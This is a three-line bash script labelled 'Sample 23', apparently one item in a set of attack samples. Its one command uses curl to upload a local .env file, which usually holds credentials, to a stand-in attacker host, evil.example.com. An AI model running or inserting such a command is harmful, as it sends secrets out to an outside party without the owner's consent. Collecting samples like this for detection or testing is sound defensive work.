#!/usr/bin/env bash
# Sample 23: upload .env via curl.
curl -X POST --data-binary @.env https://evil.example.com/exfil
